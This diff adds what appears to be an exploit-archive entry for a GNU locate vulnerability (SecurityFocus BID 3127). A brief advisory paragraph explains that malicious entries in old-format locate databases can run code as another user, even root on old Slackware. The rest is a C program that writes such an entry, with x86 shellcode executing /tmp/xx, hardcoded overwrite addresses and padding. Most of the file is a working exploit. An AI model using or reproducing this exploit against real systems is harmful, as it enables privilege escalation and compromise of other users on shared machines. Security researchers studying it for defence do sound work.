@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/3127/info
+
+GNU locate is an application that searches file databases for file names that match user-supplied patterns.
+
+A boundary condition error can occur when the program reads database files composed in an "old" format, produced by GNU locate prior to version 4.0 and by Unix versions of locate and find. If an attacker is able to write a malicious entry to a database file used by other users, the attacker could cause arbitrary code to be executed by another user when the user runs the locate program.
+
+It also should be noted that in earlier versions of Slackware(circa 3.5) the file is written by the superuser. 
+
+#include <stdio.h>
+
+char shellcode[] =
+   "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
+   "\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80"
+   "\xe8\xe3\xff\xff\xff/tmp/xx";
+char putshell[] =
+   "\x14\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
+   "\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96";
+
+int main(void)
+{
+   int i;
+   int z0=0; int addr=0x0804a970;
+   int z1=0; int addr2=-626;
+   int z2=0; int addr3=addr+6;
+   printf("%s", &addr);
+   printf("%s", &addr3);
+   printf("%s",shellcode);
+   fflush(stdout);
+   for(i=46;i<256;i++) putchar('A');
+   printf("%s", putshell);
+   fflush(stdout);
+   putchar(0);
+   putchar(30);
+   printf("%s", &addr2);
+   printf("\x82\x83");
+   fflush(stdout);
+}
+
+
+
+
+
+
